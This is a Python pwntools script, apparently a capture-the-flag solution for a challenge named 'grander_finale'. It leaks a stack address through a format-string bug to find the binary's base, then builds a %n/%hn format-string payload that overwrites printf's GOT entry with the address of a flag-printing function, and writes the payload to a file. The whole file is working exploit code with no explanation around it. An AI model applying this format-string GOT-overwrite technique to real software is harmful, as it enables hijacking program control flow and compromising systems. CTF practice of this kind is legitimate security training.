from pwn import *

conn = remote('chal.sigpwny.com', 1386)
# conn = process('./grander_finale')

conn.sendlineafter(b"What is your name? ", b"%9$p")
conn.recvuntil(b"Hello ")
# remove trailing exclamation point
LEAK = int(conn.recvline()[:-2], 16)
# print(f"leak: {hex(LEAK)}")

BASE_ADDR = LEAK - 0x13f8 # offset found using stack reads/last 3 digits of leak and objdump
# print(f"base address: {hex(BASE_ADDR)}")
PRINT_FLAG_ADDR = BASE_ADDR + 0x12ae
# print(f"print flag address: {hex(PRINT_FLAG_ADDR)}")
PRINTF_ADDR = BASE_ADDR + 0x3fa8
# print(f"printf address: {hex(PRINTF_ADDR)}")


# get 3 shorts from print flag address
short1 = PRINT_FLAG_ADDR & 0xffff
short2 = (PRINT_FLAG_ADDR & 0xffff0000) >> 16
short3 = (PRINT_FLAG_ADDR & 0xffffffff00000000) >> 32

# if short1 > short2 or short2 > short3:
#     print("shorts not in order")
#     print(f"short1: {hex(short1)}")
#     print(f"short2: {hex(short2)}")
#     print(f"short3: {hex(short3)}")
#     exit(1)


# # got overwrite
# exploit = b''
# # write first
# exploit += b'%' + str(short1).encode() + b'p'
# exploit += b'%14$n'
# # write second
# exploit += b'%' + str(short2 - short1).encode() + b'p'
# exploit += b'%15$n'
# # write third
# exploit += b'%' + str(short3 - short2).encode() + b'p'
# exploit += b'%16$n'
# # pad exploit to closest multiple of 8 bytes
# # exploit += b'_' * (8 - len(exploit) % 8)
# # print(len(exploit))
# # add addresses to overwrite shorts
# exploit += p64(PRINTF_ADDR)
# exploit += p64(PRINTF_ADDR + 2)
# exploit += p64(PRINTF_ADDR + 4)


# print(f"short1: {hex(short1)}")
# print(f"short2: {hex(short2)}")
# print(f"short3: {hex(short3)}")
short1_addr = PRINTF_ADDR
short2_addr = PRINTF_ADDR + 2
short3_addr = PRINTF_ADDR + 4
# print(f"short1 address: {hex(short1_addr)}")
# print(f"short2 address: {hex(short2_addr)}")
# print(f"short3 address: {hex(short3_addr)}")

# create dict that maps value of short to the address we need to overwrite it to
addr_map = {short1: short1_addr, short2: short2_addr, short3: short3_addr}

smallest_short = min(short1, short2, short3)
middle_short = max(min(short1, short2), min(max(short1, short2), short3))
large_short = max(short1, short2, short3)

# print(f"smallest short: {hex(smallest_short)}")
# print(f"middle short: {hex(middle_short)}")
# print(f"large short: {hex(large_short)}")
# print(f"smallest short address: {hex(addr_map[smallest_short])}")
# print(f"middle short address: {hex(addr_map[middle_short])}")
# print(f"large short address: {hex(addr_map[large_short])}")

# # print(exploit)



# got overwrite
exploit = b''
# write smallest short
exploit += b'%' + str(smallest_short).encode() + b'p'
exploit += b'%14$n'
# write middle short
exploit += b'%' + str(middle_short - smallest_short).encode() + b'p'
exploit += b'%15$hn'
# write large short
exploit += b'%' + str(large_short - middle_short).encode() + b'p' 
exploit += b'%16$hn'
# pad exploit to closest multiple of 8 bytes, write 0 if already a multiple of 8
if len(exploit) % 8 != 0:
    exploit += b'_' * (8 - len(exploit) % 8)
# print(len(exploit))
# add addresses to overwrite shorts
exploit += p64(addr_map[smallest_short])
exploit += p64(addr_map[middle_short])
exploit += p64(addr_map[large_short])


print(len(exploit))

print(exploit)

# write payload to file
with open('payload', 'wb') as f:
    f.write(exploit)
    
# conn.sendlineafter(b"What is your name? ", exploit)

# conn.interactive()


